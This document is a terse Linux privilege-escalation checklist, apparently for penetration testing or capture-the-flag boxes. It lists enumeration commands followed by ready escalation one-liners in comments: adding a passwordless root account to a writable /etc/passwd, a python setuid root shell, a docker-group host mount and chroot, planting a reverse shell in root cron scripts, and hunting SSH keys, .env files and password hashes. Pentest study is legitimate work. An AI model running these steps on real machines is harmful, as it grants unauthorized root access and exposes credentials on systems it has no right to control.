# Linux Box Checklist

## 1. Situational awareness
```bash
id; whoami; hostname; ip a; cat /etc/passwd | grep sh$
uname -a; cat /etc/os-release
env; echo $PATH
```

## 2. Run automated enum
```bash
# Transfer and run
./linpeas.sh | tee /tmp/lpe.out
./lse.sh -l 1
```

## 3. sudo
```bash
sudo -l
# Any binary? → https://gtfobins.github.io
# sudo <version>: sudo --version → check CVE-2021-3156 (Baron Samedit) if < 1.9.5p2
```

## 4. SUID/SGID
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# Any non-standard binary? → GTFOBins
```

## 5. Cron jobs
```bash
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron/crontabs/
# writable script called by root cron? → append reverse shell
# writable directory in PATH used by cron? → drop binary there
```

## 6. Writable files / paths
```bash
find / -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v "/dev/"
# /etc/passwd writable? → add root user: echo 'r00t::0:0::/root:/bin/bash' >> /etc/passwd
# /etc/shadow readable? → crack with john/hashcat
```

## 7. Capabilities
```bash
getcap -r / 2>/dev/null
# python3 cap_setuid → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# openssl cap_net_raw, etc.
```

## 8. Internal services
```bash
ss -tlnp
netstat -tlnp 2>/dev/null
# Port open on 127.0.0.1? → port forward and attack
```

## 9. Interesting files
```bash
find /opt /var/backups /srv /home -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null
find / -name "*.kdbx" -o -name "*.zip" -o -name "id_rsa" 2>/dev/null
cat ~/.bash_history
find / -name "config.php" -o -name ".env" 2>/dev/null | xargs grep -l "pass\|secret\|key" 2>/dev/null
```

## 10. Running processes / services
```bash
ps auxf
# Any process running as root using a writable script/binary?
pspy64   # monitor processes without root
```

## 11. NFS no_root_squash
```bash
cat /etc/exports
# no_root_squash present? → mount from attacker, set SUID on binary
```

## 12. Docker / LXC
```bash
id | grep docker   # in docker group? → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
ls -la /.dockerenv  # inside container? → escape
```

## 13. Kernel exploit
```bash
uname -r
# Only as last resort — check local exploits: linux-exploit-suggester
```
